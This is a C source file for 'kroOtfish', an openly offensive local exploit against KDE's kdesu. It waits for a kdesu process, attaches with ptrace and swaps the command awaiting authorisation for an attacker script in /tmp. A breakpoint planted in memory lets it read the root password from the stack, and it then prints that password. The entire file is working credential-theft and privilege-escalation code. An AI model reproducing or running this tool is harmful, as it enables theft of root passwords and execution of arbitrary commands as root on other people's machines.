// kroOtfish.c, 2007 M. Schallner <ms@rocksolid.at>
// dont run this at home!

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>		
#include <sys/mman.h>
#include <sys/user.h>
#include <stdio.h>
#include <stdlib.h>
#include <err.h>
#include <elf.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>

char *my_evil_script  = "/tmp/y";
char *my_evil_command = "id > /tmp/fishlog\n";

void check_wait_status (int status)
{
	if (WIFEXITED(status)) {
		printf("\texited, status=%d\n", WEXITSTATUS(status));
	} else if (WIFSIGNALED(status)) {
		printf("\tkilled by signal %d\n", WTERMSIG(status));
	} else if (WIFSTOPPED(status)) {
		printf("\tstopped by signal %d\n", WSTOPSIG(status));
	} else if (WIFCONTINUED(status)) {
		printf("\tcontinued\n");
	}
}

void attach_p (int pid)
{
	int status = 0;

	printf("attaching to process\n");
	if ((ptrace(PTRACE_ATTACH, pid, NULL, NULL)) == -1) err(1,0);
	printf("waiting for process ...\n");
	waitpid(pid, &status, WUNTRACED | WCONTINUED);
	check_wait_status(status);	
}

int wait_4_int3 (int pid)
{
	int status = 0;

	// continue process, and wait for int 3 to happen
	printf("continuing process, waiting for int3 ...\n");

	if ((ptrace(PTRACE_CONT, pid, NULL, NULL)) == -1) err(1,0);
	waitpid(pid, &status, WCONTINUED);
	check_wait_status(status);
	if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) return 1;

	if ((ptrace(PTRACE_CONT, pid, NULL, NULL)) == -1) err(1,0);
	waitpid(pid, &status, WCONTINUED);
	check_wait_status(status);

	if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) return 1;
	else return 0;
}

void *read_p (int pid, unsigned long va, void *buf, int len)
{
	unsigned long *ptr = (unsigned long *) buf;
	int i = 0;

	while (i * 4 < len) { 
		printf("\t\t\tread_p(pid: %d, va: %08x, buf: %08x, len: %d)\n",
		pid, va + i * 4, &ptr[i], len);
		ptr[i] = ptrace(PTRACE_PEEKTEXT, pid, va + i * 4, NULL);
		i++;
	}
}

unsigned long write_p (int pid, unsigned long va, void *buf, int len)
{
	long word = 0;
	int i = 0;

	printf("\t\t\twrite_p(pid: %d, va: %08x, buf: %08x, len: %d)\n",
		pid, va, buf, len);

	while (i * 4 < len) {
		memcpy(&word, buf + i * 4, 4);
		printf("\t\t\t\twrite_p: filled word with: %08x\n", word);
		word = ptrace(PTRACE_POKETEXT, pid , va + i * 4, word);
		i++;
	}

	return word;
}

unsigned long find_str_p (int pid, unsigned long va, int len, char *needle)
{
	unsigned int word;
	int i = 0;

	int needle_strl = strlen(needle);
	int found=0; 

	while (i < len && !errno && found < needle_strl) { 
		word = ptrace(PTRACE_PEEKTEXT, pid, va + i, NULL);
		if( (unsigned char) word == needle[found]) { 
			found++;
		} else if(found) found=0;
		i++;
	}
	if( found == needle_strl) return va+i-found;
		
	return 0;
}

void detach_p (int pid)
{
	printf("detaching ...\n");
	if(ptrace(PTRACE_DETACH, pid , NULL , NULL) < 0) err(1,0);
}

unsigned long va2offset(unsigned long va, void *buf, int bufsize) 
{
	Elf32_Ehdr 	*ehdr;
	Elf32_Phdr 	*phdr; 
	int 		i;
	unsigned long	va_offs=0;

	ehdr = (Elf32_Ehdr *)buf;
	for (i = 0; i < ehdr->e_phnum; i++) {
                phdr =  (Elf32_Phdr *) ((char *)buf + ehdr->e_phoff + 
			(i * ehdr->e_phentsize));
                if (va >=  phdr->p_vaddr &&
                    va <= (phdr->p_vaddr + phdr->p_filesz)) {
                        va_offs = va - phdr->p_vaddr + phdr->p_offset;
                        return va_offs;		
                }
        }

	return 0;
}

unsigned long find_symbol(char *symbol_name, void *buf, unsigned int bufsize)
{
	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)buf;
	Elf32_Phdr *ptbl = NULL, *phdr;
	Elf32_Dyn  *dtbl = NULL, *dyn;
 	Elf32_Rel  *rel_entry;
	Elf32_Sym  *symtab = NULL, *sym;
	char       *strtab = NULL, *str;
	unsigned int         i, j,str_sz, sym_ent=0, size;
	unsigned int *pltptr;
	unsigned int pltrel;	
 	char	   *pltgot, *jmprel;

	ptbl = (Elf32_Phdr *)((char *)buf + ehdr->e_phoff);
	for (i=0; i < ehdr->e_phnum; i++) {		
		phdr = &ptbl[i];
		if ( phdr->p_type == PT_DYNAMIC ) {
			/* dynamic linking info: imported routines */
			dtbl = (Elf32_Dyn *) ((char *)buf + phdr->p_offset);

			for ( j = 0; j < (phdr->p_filesz / 
					sizeof(Elf32_Dyn)); j++ ) {
				dyn = &dtbl[j];
				switch ( dyn->d_tag ) {
				case DT_STRTAB:
					strtab = (char *)
						dyn->d_un.d_ptr;
					break;
				case DT_STRSZ:
					str_sz = dyn->d_un.d_val;
					break;
				case DT_SYMTAB:
					symtab = (Elf32_Sym *)
						dyn->d_un.d_ptr;
					break;
				case DT_SYMENT:
					sym_ent = dyn->d_un.d_val;
					break;
				case DT_PLTGOT:
					pltgot = (char *)dyn->d_un.d_ptr;
					break;
				case DT_JMPREL:
					jmprel = (char *)dyn->d_un.d_ptr;
					break;
				}
			}	
		}
	}

	for ( i = 0; i < ehdr->e_phnum; i++ ) {
		phdr = &ptbl[i];

		if (phdr->p_type == PT_LOAD) {
		if (strtab >= (char *)phdr->p_vaddr && strtab < 
			(char *)phdr->p_vaddr + phdr->p_filesz) {
			strtab = (char *)buf + phdr->p_offset + 
				((int) strtab - phdr->p_vaddr);
		}
		if ((char *)symtab >= (char *)phdr->p_vaddr && (char *) symtab < 
					(char *)phdr->p_vaddr + 
					phdr->p_filesz) {
			symtab = (Elf32_Sym*)((char *)(buf) + phdr->p_offset + 
				(int) symtab - phdr->p_vaddr);
		}
		if ((char *)pltgot >= (char *)phdr->p_vaddr && (char *) pltgot < 
					(char *)phdr->p_vaddr + 
					phdr->p_filesz) {
			pltgot = (char *)buf + phdr->p_offset + 
				((unsigned int)pltgot - phdr->p_vaddr);
		}
		if ((char *)jmprel >= (char *)phdr->p_vaddr && (char *) jmprel < 
					(char *)phdr->p_vaddr + 
					phdr->p_filesz) {
			jmprel = (char *)buf + phdr->p_offset + 
				((unsigned int)jmprel - phdr->p_vaddr);
		}
		}
	}

	if ( ! symtab ) return 0;
	if ( ! strtab )	return 0;

	// chk glob syms
	if(sym_ent)
	for ( i = 1; i < size / sym_ent; i++ ) {
		sym = &symtab[i];
		str = &strtab[sym->st_name];
		if(sym->st_value && (strstr(str, symbol_name))) 
			return sym->st_value;
	}

	// check relocs
	if( pltgot && jmprel)
	for(pltptr = (unsigned int*)(pltgot + 12); *pltptr; pltptr++) {
		pltrel = *((unsigned int *)((char *)buf + 
			 va2offset(*pltptr, buf, bufsize) + 1));
		if(pltrel <  buf) {
			rel_entry = (Elf32_Rel *)((char *)jmprel + pltrel);	
			sym = &symtab[rel_entry->r_info >> 8];
			str = &strtab[sym->st_name];
			
  			if(strstr(str, symbol_name)) return *pltptr-6;
		}
 	}

	return 0;
}

int find_p(char *proc, char*proc_cmdline) {
	DIR *dir_proc;
        struct dirent *dir_ent;
	char filename[256];
	int fd;
	char procname[256];
	int pid = 0;
	char *s;

	printf("\tlooking for %s ... ", proc);

	if (!(dir_proc = opendir("/proc/")))err(1,0);

	while ((dir_ent = readdir(dir_proc)) && !pid) {
		if(dir_ent->d_name[0] >= '1' && dir_ent->d_name[0] <= '9') {
		// found a proc
			snprintf(filename, 255, "/proc/%s/cmdline", 
				 dir_ent->d_name);
			if ((fd = open(filename, O_RDONLY)) != -1) {
				procname[read(fd, procname, 255)] = 0; // terminator 
				// go behind kdesu
				s = procname; while(*s)s++; s++;
			
				snprintf(proc_cmdline, 1023, "%s", s);
				close(fd);
				// terminator ii: limit after "kdesu"
				procname[strlen(proc)] = 0; 
				if(strstr(procname, proc)) pid = atoi(dir_ent->d_name);
			}		
		} 
	}
	closedir(dir_proc);
	pid ? printf("found\n") : printf("not found\n");	

	return pid;
}

int main (int argc, char **argv) 
{
	int pid=0, fd;
	unsigned int file_size, insn_cc, insn_checkInstall;
	unsigned long va_checkInstall, va_bss_start, password_p, found_p;
	void *buf;
	char *password = "not found!";
	char proc_cmdline[1024]; // we read kdesu cmdline here
	char *script;
	char tmp[1024];
	struct stat tmpstat;
	struct user_regs_struct regs;

	printf("kroOtfish, 2007 Mario Schallner\n\n");

	// background
	printf("backgrounding ...\n");
	if(fork()) exit(1);	
	while (!(pid = find_p("kdesu", proc_cmdline))) sleep(3);

	printf("\tfound kdesu: pid %d, wants to execute '%s'\n", pid, proc_cmdline);

	if (strlen(proc_cmdline) < strlen(my_evil_script)) { 
		printf("kdesu command to small!\n"); exit(1); 
	}
	
	// open kdesu
	if ((fd = open("/usr/bin/kdesu", O_RDONLY) ) == -1) err(1, 0);
	fstat(fd, &tmpstat);
	file_size = tmpstat.st_size;
        buf = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if(buf == MAP_FAILED) err(1, 0);

	// locate SuProcess::checkInstall
	if(!(va_checkInstall = find_symbol("checkInstall", buf, file_size)))exit(3);;
	
	printf("\tfound 'SuProcess::checkInstall' @ %08x\n", va_checkInstall);	

	// locate __bss_start
	if(!(va_bss_start = find_symbol("__bss_start", buf, file_size))) exit(3);;
	printf("\tfound '__bss_start': %08x\n", va_bss_start);	

	munmap(buf, file_size);
	close(fd);

	attach_p(pid);
	
	// inject command
	printf("injecting very evil command ...\n");
	printf("replacing '%s' by '%s' from %08x to 0xffffffff\n", 
		proc_cmdline, my_evil_script, va_bss_start);

	printf("\n\nsearching '%s'\n");
	if( found_p = find_str_p(pid, va_bss_start, 500000, proc_cmdline)) {
		read_p (pid, found_p, tmp, strlen(proc_cmdline+1));
		printf("\tfound @ %08x: '%s'\n", found_p, tmp);
		printf("replacing %d bytes with '%s'\n", strlen(my_evil_script), 
			my_evil_script);
		write_p(pid, found_p, my_evil_script, strlen(my_evil_script));

		while( found_p = find_str_p(pid, found_p+4, 500000, proc_cmdline) ) {
			read_p (pid, found_p, tmp, strlen(proc_cmdline+1));
			printf("\tfound @ %08x: '%s'\n", found_p, tmp);
			printf("\treplacing %d bytes with '%s'\n", 
				strlen(my_evil_script), my_evil_script);
			write_p(pid, found_p, my_evil_script, strlen(my_evil_script));
		}
	}

	// set breakpoint
	printf("\tsetting breakpoint @ %08x\n", va_checkInstall);
	// get instruction
	printf("\t\treading original instruction bytes ...\n");
	read_p (pid, va_checkInstall, &insn_cc, 4);
	insn_checkInstall = insn_cc;

	printf("\t\toriginal instruction bytes: %08x\n", insn_checkInstall);

	// write int3
	insn_cc &= 0xffffff00;
	insn_cc ^= 0x000000cc; // opcode int3 

	printf("\t\tmodifying to: %08x\n", insn_cc);

	printf("\t\twriting breakpoint ...\n");
	write_p (pid, va_checkInstall, &insn_cc, 4);
	printf("\t\tbreakpoin written!\n");

	// detach_p(pid); exit(0);

	// wait for breakpoint		
	if (!wait_4_int3(pid)) { 
		printf("exiting without break\n"); 
		if ((ptrace(PTRACE_CONT, pid, NULL, NULL)) == -1) err(1,0);
		detach_p(pid); exit(2); 
	}

	printf("BREAKPOINT HIT!!\n");
	if ((ptrace(PTRACE_GETREGS, pid, NULL, &regs)) == -1) err(1,0);	
	regs.eip--; // reposition at int3 again
	printf("stopped at EIP: %08x\n", regs.eip);

	// fish password	
	printf("fishing password: getting pointer\n");
	read_p (pid, regs.esp+8, &password_p, 4);
	printf("password at: %08x\n", password_p);
	password = calloc(1, 1024);
	printf("now really fishing password\n");
	read_p (pid, password_p, password, 20);

	// lay egg
	// open sesame
	printf("creating very evil script\n");
        if ((fd = open(my_evil_script, O_RDWR|O_CREAT) ) == -1) err(1, 0);
	script = "#!/bin/bash\n";
	printf("writing '%s'\n", script);
	write(fd, script, strlen(script));
	script = my_evil_command;
	printf("writing '%s'\n", script);
	write(fd, script, strlen(script));
	script = proc_cmdline;
	printf("writing '%s'\n", script);
	write(fd, script, strlen(script));
	close(fd);

	// restore original instruction
	printf("restoring original bytes\n");
	write_p (pid, regs.eip, &insn_checkInstall, 4);
	// restore regs
	printf("resetting eip and restoring registers\n");
	if ((ptrace(PTRACE_SETREGS, pid, NULL, &regs)) == -1) err(1,0);

	// let proc continue
	detach_p(pid);	

	printf("\n>>> root password: '%s' <<<\nhave a lot of fun!\n", password);

	exit(0);
}

// EOF
